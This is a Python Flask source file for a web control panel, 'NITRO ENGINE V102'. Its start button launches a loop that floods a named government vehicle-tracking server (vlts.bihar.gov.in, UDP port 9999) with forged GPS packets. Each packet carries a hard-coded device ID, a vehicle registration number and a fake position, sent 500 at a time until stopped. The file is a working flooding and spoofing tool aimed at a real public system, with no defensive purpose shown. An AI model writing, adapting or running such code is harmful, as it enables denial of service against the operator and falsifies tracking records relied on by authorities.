import os
from flask import Flask, render_template_string, request, jsonify
import socket
import threading
from datetime import datetime

app = Flask(__name__)

# State management
status = {"firing": False, "count": 0}

HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>NITRO V102</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 20px; }
        .box { border: 2px solid #333; padding: 30px; display: inline-block; border-radius: 10px; background: #111; }
        .count { font-size: 50px; color: #fff; margin: 20px 0; }
        .btn { padding: 15px 30px; font-size: 18px; cursor: pointer; border: none; border-radius: 5px; width: 100%; margin-bottom: 10px; }
        .start { background: #008000; color: #fff; }
        .stop { background: #b30000; color: #fff; }
    </style>
</head>
<body>
    <div class="box">
        <h1>🚀 NITRO ENGINE V102</h1>
        <div class="count" id="pc">0</div>
        <form action="/action" method="post">
            <button class="btn start" name="btn" value="start">🔥 START ENGINE</button>
            <button class="btn stop" name="btn" value="stop">🛑 STOP ENGINE</button>
        </form>
    </div>
    <script>
        setInterval(() => {
            fetch('/data').then(r => r.json()).then(d => {
                document.getElementById('pc').innerText = d.count.toLocaleString();
            });
        }, 1000);
    </script>
</body>
</html>
"""

def fire():
    target = ("vlts.bihar.gov.in", 9999)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while status["firing"]:
        now = datetime.now()
        pkt = f"$PVT,EGAS,2.1.1,NR,01,L,862567075041793,BR04GA5974,1,{now.strftime('%d%m%Y')},{now.strftime('%H%M%S')},25.65,N,84.78,E,0.0,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*".encode()
        for _ in range(500):
            sock.sendto(pkt, target)
            status["count"] += 1
    sock.close()

@app.route('/')
def home(): return render_template_string(HTML)

@app.route('/data')
def data(): return jsonify(count=status["count"])

@app.route('/action', methods=['POST'])
def action():
    if request.form.get('btn') == "start" and not status["firing"]:
        status["firing"] = True
        threading.Thread(target=fire, daemon=True).start()
    else: status["firing"] = False
    return home()

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
